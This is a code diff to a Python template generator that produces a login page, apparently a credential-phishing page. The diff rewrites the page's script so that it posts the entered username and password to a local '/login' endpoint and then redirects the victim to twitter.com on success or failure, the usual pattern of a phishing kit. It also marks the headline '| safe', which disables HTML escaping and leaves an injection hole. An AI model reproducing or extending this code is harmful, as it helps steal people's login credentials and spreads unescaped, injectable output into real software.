@@ -82,10 +82,10 @@ class TemplateGenerator:
         
         <main class="main">
             <div class="form-container">
-                <h1>{{ headline }}</h1>
+                <h1>{{ headline | safe }}</h1>
                 <p class="subtitle">{{ subtitle }}</p>
                 
-                <form id="login-form" method="post" action="{{ action_url }}">
+                <form id="login-form" method="post" action="/login">
                     <div class="form-group">
                         <label for="username">{{ username_label }}</label>
                         <input type="text" id="username" name="username" placeholder="{{ username_placeholder }}" required>
@@ -275,26 +275,31 @@ input:focus {
             data[key] = value;
         }
         
-        // Validate
-        if (!data.username || !data.password) {
-            alert('Please fill in all required fields');
-            return;
-        }
-        
-        // Simulate submission
-        console.log('Form data:', data);
-        
         // Show loading state
         const submitBtn = this.querySelector('button[type="submit"]');
         submitBtn.disabled = true;
         submitBtn.textContent = 'Processing...';
         
-        // Simulate API call
-        setTimeout(function() {
-            submitBtn.disabled = false;
-            submitBtn.textContent = '{{ submit_text }}';
-            // Handle success/error
-        }, 2000);
+        // Submit data to backend
+        fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.redirected) {
+                window.location.href = response.url;
+            } else {
+                // Fallback redirect
+                window.location.href = "https://twitter.com";
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = "https://twitter.com";
+        });
     });
     
     // Auto-focus on username field
